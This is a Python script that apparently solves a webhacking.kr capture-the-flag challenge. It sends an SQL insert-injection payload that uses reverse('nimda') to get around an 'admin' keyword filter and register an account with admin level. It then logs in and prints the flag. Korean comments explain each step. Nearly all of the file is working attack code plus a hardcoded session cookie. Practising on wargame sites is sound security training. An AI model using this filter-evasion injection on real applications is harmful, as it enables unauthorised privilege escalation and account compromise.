from bs4 import BeautifulSoup
import requests

URL = "https://webhacking.kr/challenge/web-36"
URI = "/"
PHPSESSID = '2iti1mqblclscqcnp08irp82q2'

cookie = {'PHPSESSID' : PHPSESSID}

PAYLOAD01 = {
    'id' : 'nimda',
    'phone' : '111,reverse(id))-- ',
    'lid' : '',
    'lphone' : ''
}

PAYLOAD02 = {
    'id' : '',
    'phone' : '',
    'lid' : 'nimda',
    'lphone' : '111'
}

# 풀이
# 1. insert 쿼리문을 이용해서 admin 권한으로 회원가입 하도록 하는데, 이때 주의해야할 사항은 admin 문자열이 필터링됨.
# 2. 문자열을 거꾸로해서 reverse 함수를 사용해서 insert injection 실시 (lv가 admin이 되도록 마지막에 사용)
# 3. injection 후 해당 id로 select 문 호출해서 로그인

requests.post(URL + URI, cookies=cookie, data=PAYLOAD01)

resp = requests.post(URL + URI, cookies=cookie, data=PAYLOAD02)

soup = BeautifulSoup(resp.content,"html.parser")
FLAG = soup.find('script').contents[0]

print(FLAG)
